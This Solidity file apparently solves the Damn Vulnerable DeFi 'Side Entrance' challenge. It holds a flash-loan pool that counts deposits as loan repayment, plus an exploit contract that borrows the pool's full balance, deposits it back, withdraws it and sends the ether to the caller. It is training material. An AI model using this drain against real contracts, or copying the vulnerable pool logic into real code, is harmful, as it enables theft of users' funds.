// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {

        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        

        (bool success, ) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success, "fund withdrawal failed");

        // console.log('pool balance after withdraw', address(this).balance);
        // console.log('exploit contract after withdraw', msg.sender.balance);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        require(balanceBefore >= amount, "Not enough ETH in balance");
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract SideEntranceLenderPoolExploit{

    address private poolAddress;
    bool private isDeposit;
    constructor(address _pool){
        poolAddress = _pool;
    }

    function pawn() external{

        (bool success, ) = poolAddress.call(abi.encodeWithSignature("flashLoan(uint256)", poolAddress.balance));
        require (success, "pawn flashloan failed");
        
        (bool withdrawSuccess, ) = poolAddress.call(abi.encodeWithSignature("withdraw()"));
        require (withdrawSuccess, "withdraw failed");


        (bool transferSuccess, ) = payable(msg.sender).call{value: address(this).balance}("");

    }


    fallback() external payable {
        if(!isDeposit){
            (bool success, ) = poolAddress.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
            isDeposit = true;
            require(success, "deposit from fallback failed");
        }      

    }
}
 